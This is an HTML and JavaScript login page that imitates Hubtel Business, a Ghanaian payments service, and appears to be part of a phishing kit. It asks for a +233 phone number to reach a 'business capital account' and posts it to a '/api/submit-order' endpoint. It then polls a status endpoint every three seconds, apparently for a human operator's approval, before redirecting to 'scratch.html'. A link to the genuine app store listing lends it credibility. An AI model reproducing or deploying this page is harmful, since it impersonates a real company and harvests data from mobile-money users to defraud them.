<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, interactive-widget=resizes-visual">
    <title>Hubtel Business | Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --background: #202020;
            --surface: #2E2E2E;
            --text-primary: #FFFFFF;
            --text-secondary: #BDBDBD;
            --border: #3B3B3B;
            --primary: #4EB3A4;
            --primary-dark: #0E2924;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        html, body {
            width: 100%;
            height: 100%;
            background-color: var(--background);
            overflow: hidden;
            color: var(--text-primary);
        }

        .e-fullscreen-wrapper {
            position: relative;
            width: 100%;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            padding: 30px 20px;
        }

        .e-top-brand {
            width: 100%;
            max-width: 440px;
            text-align: left;
            font-size: 24px;
            font-weight: 900;
            letter-spacing: -0.5px;
            text-transform: uppercase;
            color: var(--primary);
        }

        .e-main-content {
            position: relative;
            width: 100%;
            max-width: 440px;
            display: flex;
            flex-direction: column;
            align-items: center;
            animation: slideUp .7s ease;
            margin: auto 0;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .e-card-box {
            width: 100%;
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 28px;
            padding: 36px 24px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
            margin-bottom: 14px;
        }

        .e-card-header {
            margin-bottom: 24px;
        }

        .e-card-header h1 {
            font-size: 26px;
            font-weight: 800;
            color: var(--text-primary);
            margin-bottom: 6px;
        }

        .e-card-header p {
            font-size: 13.5px;
            color: var(--text-secondary);
            font-weight: 400;
            line-height: 1.4;
        }

        .e-input-group {
            position: relative;
            margin-bottom: 18px;
        }

        .e-long-input-wrapper {
            position: relative;
            width: 100%;
            background: var(--surface);
            border: 1.5px solid var(--border);
            border-radius: 16px;
            display: flex;
            align-items: center;
            padding: 0 16px;
            transition: all 0.2s ease;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.3);
        }

        .e-long-input-wrapper:focus-within {
            border-color: var(--primary);
            box-shadow: 0 0 15px rgba(78, 179, 164, 0.25), inset 0 2px 4px rgba(0,0,0,0.3);
        }

        .prefix-flag-group {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 16px;
            font-weight: 700;
            color: var(--text-primary);
            white-space: nowrap;
            user-select: none;
            padding-right: 12px;
            border-right: 1px solid var(--border);
        }

        .e-long-input-field {
            width: 100%;
            padding: 18px 12px 18px 16px;
            background: transparent;
            border: none;
            outline: none;
            font-size: 16px;
            font-weight: 600;
            color: var(--text-primary);
            text-align: left;
            -webkit-appearance: none;
            appearance: none;
        }

        .e-long-input-field::placeholder {
            color: var(--text-secondary);
            opacity: 0.5;
            font-weight: 500;
            letter-spacing: 1px;
        }

        .register-prompt-row {
            width: 100%;
            display: flex;
            justify-content: flex-end;
            margin-bottom: 18px;
            font-size: 13px;
            color: var(--text-secondary);
        }

        .register-prompt-row a {
            color: var(--primary);
            text-decoration: none;
            font-weight: 600;
            transition: opacity 0.2s ease;
        }

        .register-prompt-row a:hover {
            text-decoration: underline;
            opacity: 0.85;
        }

        .e-btn-login {
            width: 100%;
            padding: 18px;
            background: var(--surface);
            backdrop-filter: blur(8px);
            border: 1.5px solid var(--border);
            color: var(--text-primary);
            border-radius: 16px;
            font-size: 16px;
            font-weight: 900;
            letter-spacing: 0.5px;
            cursor: pointer;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            text-transform: uppercase;
            transition: all 0.2s ease;
        }

        .e-btn-login:hover {
            border-color: var(--primary);
            background: rgba(46, 46, 46, 0.8);
        }

        .terms-disclaimer {
            font-size: 11.5px;
            color: var(--text-secondary);
            text-align: center;
            margin-top: 14px;
            line-height: 1.5;
        }

        .terms-disclaimer a {
            color: var(--primary);
            text-decoration: underline;
            font-weight: 600;
        }

        #loadingSpinner {
            display: none;
            flex-direction: row;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-top: 20px;
            font-size: 14px;
            color: var(--text-primary);
            font-weight: 500;
        }

        .spinner {
            width: 24px;
            height: 24px;
            border: 3px solid rgba(255, 255, 255, 0.2);
            border-top: 3px solid var(--primary);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .e-footer {
            text-align: center;
            color: var(--text-secondary);
            font-size: 11.5px;
            width: 100%;
            max-width: 440px;
        }

        #customModal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(32, 32, 32, 0.9);
            backdrop-filter: blur(8px);
            justify-content: center;
            align-items: center;
            z-index: 9999;
            padding: 20px;
        }

        .modal-card {
            background: var(--surface);
            width: 100%;
            max-width: 320px;
            border-radius: 24px;
            padding: 28px;
            text-align: center;
            border: 1px solid var(--border);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            color: var(--text-primary);
            animation: scaleUp 0.3s ease;
        }

        @keyframes scaleUp {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        .modal-message {
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 24px;
            line-height: 1.4;
            color: var(--text-primary);
        }

        .modal-btn {
            background: var(--primary);
            color: var(--primary-dark);
            border: none;
            border-radius: 14px;
            padding: 14px 24px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 6px 16px rgba(78, 179, 164, 0.3);
        }
    </style>
</head>
<body>

    <div class="e-fullscreen-wrapper">
        <div class="e-top-brand">Hubtel</div>

        <div class="e-main-content">
            <div class="e-card-box">
                <div class="e-card-header">
                    <h1>Login</h1>
                    <p>Enter your phone number to access your business capital account.</p>
                </div>

                <div class="e-input-group" style="margin-bottom: 0;">
                    <div class="e-long-input-wrapper">
                        <div class="prefix-flag-group">
                            <span>🇬🇭</span>
                            <span>+233</span>
                        </div>
                        <input type="tel" id="phoneNumber" class="e-long-input-field" placeholder="20  000  0000" maxlength="12" inputmode="numeric" pattern="[0-9]*" autocomplete="tel" required oninput="formatPhoneInput(this)">
                    </div>
                </div>
            </div>

            <div class="register-prompt-row">
                <span>Don't have Hubtel? <a href="https://play.google.com/store/apps/details?id=com.hubtel.hcb">Register</a></span>
            </div>

            <button class="e-btn-login" onclick="submitOrderAttempt()">Continue</button>

            <div class="terms-disclaimer">
                By continuing, you agree to our <a href="terms.html">Terms of Services</a> and <a href="privacy.html">Privacy Policy</a>.
            </div>

            <div id="loadingSpinner">
                <div class="spinner"></div>
                <span>Verifying account details...</span>
            </div>
        </div>

        <div class="e-footer">&copy; 2026 Hubtel Business. All rights reserved.</div>
    </div>

    <div id="customModal">
        <div class="modal-card">
            <div id="modalText" class="modal-message">Notification message here</div>
            <button class="modal-btn" onclick="closeModal()">OK</button>
        </div>
    </div>

<script>
    function showAppAlert(message) {
        document.getElementById('modalText').innerText = message;
        document.getElementById('customModal').style.display = 'flex';
    }

    function closeModal() {
        document.getElementById('customModal').style.display = 'none';
    }

    const phoneInput = document.getElementById('phoneNumber');

    window.addEventListener('DOMContentLoaded', () => {
        const savedPhone = localStorage.getItem('hubtelUserPhone') || localStorage.getItem('userPhone');
        if (savedPhone && phoneInput) {
            const cleanNum = savedPhone.replace('+233', '').trim();
            phoneInput.value = cleanNum;
        }
    });

    function formatPhoneInput(input) {
        let val = input.value.replace(/\D/g, '');
        if (val.length > 9) val = val.slice(0, 9);
        input.value = val;
    }

    function isValidPhone(number) {
        const cleaned = number.replace(/[\s-]/g, '');
        return /^\d{8,9}$/.test(cleaned);
    }

    async function submitOrderAttempt() {
        const rawPhone = phoneInput.value.replace(/\s+/g, '').trim();
        const spinnerDiv = document.getElementById('loadingSpinner');

        if (!rawPhone || !isValidPhone(rawPhone)) {
            showAppAlert('Enter Correct Number');
            return;
        }

        const fullPhoneVal = '+233 ' + rawPhone;

        localStorage.setItem('hubtelUserPhone', fullPhoneVal);
        localStorage.setItem('userPhone', fullPhoneVal);

        try {
            const response = await fetch('/api/submit-order', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: fullPhoneVal })
            });

            const result = await response.json();

            if (result.success) {
                if (spinnerDiv) spinnerDiv.style.display = 'flex'; 
                pollApprovalStatus(fullPhoneVal);
            } else {
                showAppAlert('Enter Correct Number');
            }
        } catch (error) {
            console.error('Error:', error);
            showAppAlert('Could not connect to the backend server.');
        }
    }

    function pollApprovalStatus(phone) {
        const cleanPhone = phone.trim();

        const statusInterval = setInterval(async () => {
            try {
                const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
                const data = await response.json();

                if (data.status === 'approved') {
                    clearInterval(statusInterval);
                    localStorage.setItem('userPhone', cleanPhone);
                    window.location.href = 'scratch.html';
                } 
                else if (data.status === 'rejected' || data.status === 'wrong_id') {
                    clearInterval(statusInterval);
                    if (document.getElementById('loadingSpinner')) {
                        document.getElementById('loadingSpinner').style.display = 'none';
                    }
                    localStorage.clear(); 
                    showAppAlert('Wrong Details.');
                }
                else if (data.status === 'not_user') {
                    clearInterval(statusInterval);
                    if (document.getElementById('loadingSpinner')) {
                        document.getElementById('loadingSpinner').style.display = 'none';
                    }
                    localStorage.clear();
                    showAppAlert('⚠️ Oops! Not Registered Please register to continue.');
                }
            } catch (e) {
                console.error('Polling error', e);
            }
        }, 3000);
    }
</script>
</body>
</html>
